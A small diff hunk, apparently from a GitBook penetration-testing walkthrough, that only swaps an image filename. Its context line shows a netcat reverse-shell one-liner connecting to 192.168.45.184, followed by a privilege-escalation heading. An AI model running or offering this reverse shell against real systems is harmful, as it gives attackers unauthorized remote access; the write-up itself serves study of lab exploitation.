@@ -74,7 +74,7 @@ CMD:> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.184 21 >/tmp
 {"success":false}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
